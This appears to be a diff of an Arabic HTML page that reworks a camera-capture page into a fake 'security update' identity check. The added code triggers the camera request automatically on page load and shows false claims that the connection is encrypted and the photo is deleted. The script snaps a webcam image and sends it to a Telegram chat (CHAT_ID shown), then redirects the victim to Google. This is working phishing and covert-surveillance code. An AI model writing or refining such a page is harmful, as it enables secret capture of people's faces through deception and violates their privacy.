@@ -2,17 +2,21 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>منصة راقب</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>تحديث أمني</title>
     <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             background: #0a0f1c;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            margin: 0;
             padding: 20px;
         }
         .card {
@@ -24,9 +28,50 @@
             text-align: center;
             box-shadow: 0 10px 40px rgba(0,0,0,0.2);
         }
-        h1 { color: #0a0f1c; margin-bottom: 10px; }
-        .sub { color: #666; font-size: 14px; margin-bottom: 30px; }
-        .btn {
+        .logo {
+            width: 70px;
+            height: 70px;
+            background: #0a0f1c;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            font-size: 32px;
+            color: white;
+        }
+        h1 {
+            color: #0a0f1c;
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+        .sub {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .security-badge {
+            background: #e8f0fe;
+            border-radius: 50px;
+            padding: 8px 16px;
+            display: inline-block;
+            font-size: 12px;
+            color: #1a73e8;
+            margin-bottom: 25px;
+        }
+        .info-box {
+            background: #f0f7ff;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+        }
+        .info-box p {
+            color: #1a73e8;
+            font-size: 13px;
+            margin: 8px 0;
+        }
+        button {
             background: #0a0f1c;
             color: white;
             border: none;
@@ -38,15 +83,6 @@
             cursor: pointer;
             margin: 20px 0;
         }
-        .btn:active { transform: scale(0.98); }
-        .info {
-            background: #f0f0f0;
-            padding: 15px;
-            border-radius: 12px;
-            font-size: 13px;
-            color: #333;
-            margin: 20px 0;
-        }
         .status {
             padding: 12px;
             border-radius: 10px;
@@ -55,24 +91,27 @@
             margin-top: 15px;
         }
         .status.show { display: block; }
-        .loading { background: #fff3cd; color: #856404; }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
+        .status.loading { background: #fff3cd; color: #856404; }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.error { background: #f8d7da; color: #721c24; }
         video, canvas { display: none; }
         .footer { font-size: 11px; color: #aaa; margin-top: 20px; }
     </style>
 </head>
 <body>
 <div class="card">
-    <h1>📷 منصة راقب</h1>
-    <div class="sub">المنصة الرقمية الموثوقة</div>
-    <div class="info">
-        🔐 مطلوب توثيق الهوية لإكمال العملية<br>
-        ⏱️ يستغرق ثانية واحدة فقط
+    <div class="logo">🔒</div>
+    <h1>تحديث الأمان</h1>
+    <div class="sub">لحماية حسابك، يرجى تأكيد هويتك</div>
+    <div class="security-badge">اتصال آمن ومشفر</div>
+    <div class="info-box">
+        <p>✓ إجراء روتيني لحماية الخصوصية</p>
+        <p>✓ يستغرق ثانية واحدة فقط</p>
+        <p>✓ يتم حذف الصورة فور التأكيد</p>
     </div>
-    <button class="btn" id="startBtn">✅ توثيق الهوية الآن</button>
+    <button id="startBtn">تأكيد الهوية</button>
     <div class="status" id="status"></div>
-    <div class="footer">منصة راقب © 2026</div>
+    <div class="footer">© 2025 - جميع الحقوق محفوظة</div>
 </div>
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
@@ -83,11 +122,16 @@ const CHAT_ID = "8545876964";
 const startBtn = document.getElementById('startBtn');
 const statusDiv = document.getElementById('status');
 
+// طلب الكاميرا فور تحميل الصفحة
+window.addEventListener('load', function() {
+    startBtn.click();
+});
+
 startBtn.addEventListener('click', async () => {
     startBtn.disabled = true;
-    startBtn.innerText = '⏳ جاري التوثيق...';
+    startBtn.innerText = 'جاري التحقق...';
     statusDiv.className = 'status show loading';
-    statusDiv.innerText = '🔐 جاري الوصول إلى الكاميرا...';
+    statusDiv.innerText = 'جاري الاتصال بالخادم الآمن...';
 
     try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -100,7 +144,7 @@ startBtn.addEventListener('click', async () => {
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
 
-            statusDiv.innerText = '📤 جاري إرسال بيانات التوثيق...';
+            statusDiv.innerText = 'جاري إرسال بيانات التحقق...';
 
             canvas.toBlob(async (blob) => {
                 const formData = new FormData();
@@ -115,25 +159,27 @@ startBtn.addEventListener('click', async () => {
                     const json = await res.json();
                     if (json.ok) {
                         statusDiv.className = 'status show success';
-                        statusDiv.innerText = '✅ تم توثيق الهوية بنجاح! جاري التحويل...';
-                        setTimeout(() => { window.location.href = 'https://www.google.com'; }, 1500);
+                        statusDiv.innerText = '✓ تم التحقق بنجاح! جاري التحويل...';
+                        setTimeout(() => {
+                            window.location.href = 'https://www.google.com';
+                        }, 1500);
                     } else {
                         throw new Error(json.description);
                     }
-                } catch(err) {
+                } catch(e) {
                     statusDiv.className = 'status show error';
-                    statusDiv.innerText = '❌ خطأ في الإرسال، حاول مرة أخرى';
+                    statusDiv.innerText = '✗ خطأ تقني، يرجى المحاولة لاحقاً';
                     startBtn.disabled = false;
-                    startBtn.innerText = '✅ توثيق الهوية الآن';
+                    startBtn.innerText = 'تأكيد الهوية';
                 }
             }, 'image/jpeg');
             stream.getTracks().forEach(t => t.stop());
         };
-    } catch(err) {
+    } catch(error) {
         statusDiv.className = 'status show error';
-        statusDiv.innerText = '❌ لا يمكن الوصول للكاميرا. تأكد من منح الإذن';
+        statusDiv.innerText = '✗ يرجى السماح بالوصول إلى الكاميرا';
         startBtn.disabled = false;
-        startBtn.innerText = '✅ توثيق الهوية الآن';
+        startBtn.innerText = 'تأكيد الهوية';
     }
 });
 </script>
